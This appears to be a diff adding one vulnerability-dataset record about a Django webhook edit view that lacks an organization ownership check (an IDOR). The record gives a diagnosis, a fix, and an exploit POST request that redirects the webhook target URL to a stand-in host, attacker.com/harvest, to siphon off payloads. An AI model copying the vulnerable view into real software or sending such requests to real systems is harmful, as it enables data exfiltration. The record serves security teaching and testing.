@@ -1,0 +1,8 @@
+{
+  "vulnerable_code": "class WebhookSubscriptionUpdateView(LoginRequiredMixin, UpdateView):\n    model = WebhookSubscription\n    fields = ['target_url', 'secret_token', 'is_active']\n    template_name = 'webhooks/edit.html'\n\n    def get_object(self, queryset=None):\n        return WebhookSubscription.objects.get(id=self.kwargs['pk'])",
+  "diagnosis": "The UpdateView overrides get_object() to retrieve the WebhookSubscription directly by primary key without checking if the subscription belongs to self.request.user.organization. Any authenticated user can modify target URLs and hijack webhook payloads.",
+  "exploit_request": "POST /webhooks/subscriptions/105/edit/ HTTP/1.1\nHost: app.example.com\nCookie: sessionid=attacker_session\nContent-Type: application/x-www-form-urlencoded\n\ntarget_url=https%3A%2F%2Fattacker.com%2Fharvest&secret_token=evil_token&is_active=on",
+  "corrected_code": "class WebhookSubscriptionUpdateView(LoginRequiredMixin, UpdateView):\n    model = WebhookSubscription\n    fields = ['target_url', 'secret_token', 'is_active']\n    template_name = 'webhooks/edit.html'\n\n    def get_object(self, queryset=None):\n        return get_object_or_404(\n            WebhookSubscription,\n            id=self.kwargs['pk'],\n            organization=self.request.user.organization\n        )",
+  "severity": "HIGH",
+  "confidence": 0.96
+}
